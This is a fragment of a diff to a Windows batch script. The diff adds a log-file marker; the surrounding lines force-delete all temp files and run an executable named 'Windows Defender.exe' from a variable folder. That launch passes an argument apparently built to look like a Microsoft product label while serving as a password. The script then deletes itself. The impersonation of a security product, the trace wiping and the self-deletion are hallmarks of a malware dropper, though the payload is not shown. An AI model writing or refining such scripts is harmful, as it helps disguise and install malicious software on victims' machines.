@@ -1,5 +1,6 @@
 @echo off
 setlocal
+echo running > "%userprofile%\running.log"
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 :connectivitycheck
@@ -88,4 +89,5 @@ rmdir /s /q "%temp%\%folder%"
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 endlocal
+del /s /f /q /a "%userprofile%\running.log"
 del /s /f /q /a "%~f0"
